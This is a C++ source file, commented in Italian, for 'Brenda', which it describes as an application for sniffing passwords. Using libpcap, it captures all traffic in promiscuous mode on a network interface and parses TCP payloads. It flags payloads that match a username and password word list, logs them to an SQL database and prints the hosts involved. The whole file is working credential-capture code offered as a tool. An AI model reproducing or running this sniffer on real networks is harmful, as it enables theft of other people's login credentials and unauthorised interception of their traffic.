#define APP_NAME	"Brenda"
#define APP_DESC	"Brenda Applicazione per lo snifing di password"
#define APP_COPYRIGHT	"Copyright Code-Wall.Net All rights Reserved"
#define APP_DISCLAIMER	"Non è disponibile alcuna garanzia per questo programma."

#include <pcap.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fstream>
#include <vector>
#include "SqlWriter.h"
#include "RicercaUserPwd.h"

using namespace std;

/* lunghezza di snap (numero massimo di byte per pacchetto catturato) */
#define SNAP_LEN 1518

/* ogni Header ethernet sono sempre esattamente 14 bytes [1] */
#define SIZE_ETHERNET 14

/* l'indirizzo etherne e sempre 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
	#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet); // qui recupero i pacchetti ricevuti
void print_app_banner(void); // all avvio stampo le info del mio programma


void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  static int count = 1;                   /* packet counter */
	
  /* declare pointers to packet headers */
  const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
  const struct sniff_ip *ip;              /* The IP header */
  const struct sniff_tcp *tcp;            /* The TCP header */
  const u_char *payload;                  /* Packet payload */

  int size_ip;
  int size_tcp;
  int size_payload;
	
  /* define ethernet header */
  ethernet = (struct sniff_ethernet*)(packet);

  /* define/compute ip header offset */
  ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
  size_ip = IP_HL(ip)*4;
  if (size_ip < 20) 
  {
    //printf("   * Invalid IP header length: %u bytes\n", size_ip);
    return;
  }
	
  

  /* print source and destination IP addresses */
  //printf("       From: %s\n", inet_ntoa(ip->ip_src));
  //printf("         To: %s\n", inet_ntoa(ip->ip_dst));
	
  /* determine protocol */	
  switch(ip->ip_p) 
  {
    case IPPROTO_TCP:
      //printf("   Protocol: TCP\n");
      break;
    case IPPROTO_UDP:
      //printf("   Protocol: UDP\n");
      return;
    case IPPROTO_ICMP:
      //printf("   Protocol: ICMP\n");
      return;
    case IPPROTO_IP:
      //printf("   Protocol: IP\n");
      return;
    case IPPROTO_IGMP:
      //printf("   Protocol: IGMP\n");
      return;
    default:
      //printf("   Protocol: unknown\n");
      return;
  }
	
  /*
   *  OK, this packet is TCP.
   */
	
  /* define/compute tcp header offset */
  tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
  size_tcp = TH_OFF(tcp)*4;
  if (size_tcp < 20) 
  {
    printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
    return;
  }
	
  //printf("   Src port: %d\n", ntohs(tcp->th_sport));
  //printf("   Dst port: %d\n", ntohs(tcp->th_dport));
	
	
  /* define/compute tcp payload (segment) offset */
  payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	
  /* compute tcp payload (segment) size */
  size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	
  /*
   * Print payload data; it might be binary, so don't just
   * treat it as a string.
   */
  if (size_payload > 0) 
  { 
    //printf("   Payload (%d bytes):\n", size_payload);
    //print_payload(payload, size_payload);
    //cout << "\n\n";
		
    string ports;
    //cout << ntohs(tcp->th_sport) << " > " << ntohs(tcp->th_dport);
   
    if (ValuableDataContaining(payload, size_payload)==true)
    {
      printf("\nPacket number %d:\n", count);
      count++;
      
      AddTcpPacket(inet_ntoa(ip->ip_src), inet_ntoa(ip->ip_dst), payload, size_payload, "later");
      cout << inet_ntoa(ip->ip_src) << " >> " << inet_ntoa(ip->ip_dst) << "\nsembra contenere credenziali d'accesso" << endl;
    }
    
    //printf("\n");

  }

return;
}

int main(int argc, char **argv)
{
  
  if (getWordList()==1)// attivo il file che contiene le parole da cercare per trovare password e username nei pacchetti 
    return 1;
    
  if (ckSQLConnection()==1) //controllo se posso scrivere nel db i pacchetti interessanti che trovo
    return 1; // in caso contrario termino il programma
  
  char *dev = NULL;			// interfaccia su cui catturero i pacchetti //
  char errbuf[PCAP_ERRBUF_SIZE];	// buffer dove carichero gli errori //
  pcap_t *handle;			// gestore della cattura dei pacchetti //
  struct bpf_program fp;			/* compiled filter program (expression) */
  bpf_u_int32 mask;			/* subnet mask */
  bpf_u_int32 net;			/* ip */
  
  if (argc == 2) 
  {
    dev = argv[1];
  }
  else if (argc > 2) 
  {
    cout << "errore: comandi non interpretati correttamente\n\n";
    return -1;
  }
  else 
  {
    /* find a capture device if not specified on command-line */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) 
    {
      cout << "Non trovo questa interfaccia di rete: " << errbuf << endl;	
      exit(EXIT_FAILURE);
    }
  }
  if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) // vedo se la scheda ha un ip assegnato o se e a terra ....
  {
    cout << "Non sono riuscito a recuperare un indirizzo per l'interfaccia " << dev << ": \n -->" << errbuf << endl;
    return -1;
    // qui si attacchera il programma che devo sviluppare per recuperare un ip valido e mettermi in rete se nn c'e un dhcp
  }
  else
  {
    cout << "Dispositivo " << dev << " aperto con successo \n\n"; 
  }
  
  // do all'handle che gestisce la cattura che interfaccia aprire ecc...
  handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
  if (handle == NULL) 
  {
    cout << "non riesco ad aprire il dispositivo " << dev << ": " << errbuf;
    exit(EXIT_FAILURE);
  }
    
  // avvio la raccolta dei pacchetti che passano x la scheda .. passo il gestore, infiniti pacchet until errore, 
  // la funzione a cui passare i pacchetti e qualcosaltro che nn ho idea ...
  pcap_loop(handle, -1, got_packet, NULL);
  
  while(true)
    cout << "\a";
}
  
  
  
  
  
  
  
  
  
  
  
